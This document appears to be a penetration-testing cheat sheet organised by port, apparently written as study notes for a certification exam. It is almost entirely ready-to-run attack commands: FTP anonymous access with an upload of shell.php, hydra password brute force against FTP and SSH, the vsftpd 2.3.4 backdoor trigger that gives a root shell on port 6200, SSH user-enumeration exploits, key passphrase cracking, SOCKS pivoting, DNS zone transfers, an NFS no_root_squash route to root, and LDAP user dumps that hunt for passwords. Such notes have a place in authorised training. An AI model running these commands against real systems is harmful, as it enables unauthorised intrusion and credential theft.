21 — FTP

nmap scripts first
nmap -p21 -sC -sV --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-brute <IP>
# ftp-anon: "Anonymous FTP login allowed" + file listing
# ftp-vsftpd-backdoor: checks CVE-2011-2523 (vsftpd 2.3.4)
anonymous login — correct syntax
ftp -n <IP>
# ftp> USER anonymous
# ftp> PASS anonymous
# ftp> ls -la
# ftp> binary          ← ALWAYS set before downloading
# ftp> passive         ← toggle if connection hangs
# ftp> prompt off      ← disable per-file prompts
# ftp> mget *          ← download everything
# ftp> put shell.php   ← upload if directory is writable
# ftp> bye
recursive download + brute force
lftp -u anonymous,anonymous <IP> -e "mirror --parallel=5 / /tmp/ftp_loot/; quit"
wget -r --no-passive --no-parent ftp://anonymous:anonymous@<IP>/ -P /tmp/ftp_wget/

hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP> -t 10 -V
vsftpd 2.3.4 backdoor — CVE-2011-2523
critical
nc -nv <IP> 21
# Type: USER backdoor:)   ← colon + smiley triggers backdoor
# Type: PASS anything
# Then immediately:
nc -nv <IP> 6200   # root shell on port 6200

# Upload via FTP:

22 — SSH

banner grab + version
nc -nv <IP> 22
# SSH-2.0-OpenSSH_7.2p2 → CVE-2016-6210 (user enum)
# SSH-2.0-OpenSSH_7.4   → CVE-2018-15473 (user enum)
# Any OpenSSH < 7.7     → user enum likely works
nmap -p22 --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey <IP>
username enumeration — correct tools
# Method 1 — MSF (no install needed, most reliable):
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; \
  set RHOSTS <IP>; \
  set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; \
  run; exit"
# [+] Found user: root   /   [-] User not found: nobody

# Method 2 — Python (OpenSSH < 7.7 only):
# Source: https://github.com/epi052/cve-2018-15473
# Or: find / -name "45939.py" 2>/dev/null
python3 cve-2018-15473.py <IP> --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt
brute force + private key login
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4 -V
# -t 4: SSH rate-limits; higher = lockout risk

chmod 600 id_rsa
ssh -i id_rsa <user>@<IP>
ssh -i id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <user>@<IP>

# Crack passphrase-protected key:
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
port forwarding
# Local forward — expose internal port to kali:
ssh -L <localport>:127.0.0.1:<remoteport> <user>@<IP> -N -f
# e.g. internal app on 8080 → curl http://localhost:8080
ssh -L 8080:127.0.0.1:8080 user@<IP> -N -f

# Dynamic SOCKS5 proxy (whole subnet):
ssh -D 1080 <user>@<IP> -N -f
# /etc/proxychains4.conf → add: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn <internal_IP>

53 — DNS

zone transfer — try first, always
try first
dig axfr @<IP> <domain>
# Success output:
# corp.local.        IN SOA   dc01.corp.local. ...
# dc01.corp.local.   IN A     10.10.10.10
# web.corp.local.    IN A     10.10.10.20    ← add to /etc/hosts

host -l <domain> <IP>
dnsrecon -d <domain> -t axfr -n <IP>
AXFR → parse A records → auto-add to /etc/hosts
try first
# 1. Dump raw AXFR output:
dig axfr @<IP> <domain> > axfr_output.txt

# 2. Parse A records only → IP hostname pairs:
awk '$4 == "A" {print $5, $1}' axfr_output.txt > hosts_entries.txt

# 3. Review before adding:
cat hosts_entries.txt

# 4. Append to /etc/hosts:
sudo tee -a /etc/hosts < hosts_entries.txt
subdomain brute force
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r <IP>
dig @<IP> <domain> ANY
dig @<IP> -x <IP>

111 / 2049 — NFS

no_root_squash privesc

sudo chmod +s /tmp/nfs/bash

# ON VICTIM:
/tmp/bash -p   # -p preserves effective UID → root shell

389 / 636 — LDAP

step 1 — test anonymous bind (always run first)
ldapsearch -x -H ldap://<IP> -s base namingContexts
# SUCCESS: namingContexts: DC=corp,DC=local   ← YOUR BASE DN
# FAILURE: Operations error (1) or Insufficient access (50)
step 2 — dump users (if anon bind works)
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=local" "(objectClass=user)" \
  sAMAccountName userPrincipalName description memberOf \
  userAccountControl servicePrincipalName 2>/dev/null | tee ~/exam/loot/ldap_users.txt

# Hunt passwords in description field:
grep "description:" ~/exam/loot/ldap_users.txt | grep -iv "built-in\|default\|accounts"
step 3 — authenticated enum + windapsearch
ldapsearch -x -H ldap://<IP> -D "<user>@corp.local" -w '<pass>' \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description servicePrincipalName

# windapsearch (cleaner): https://github.com/ropnop/windapsearch
python3 windapsearch.py --dc-ip <IP> -u "" -U               # all users, anon
python3 windapsearch.py --dc-ip <IP> -u "<user>@corp.local" -p '<pass>' --da  # DA members
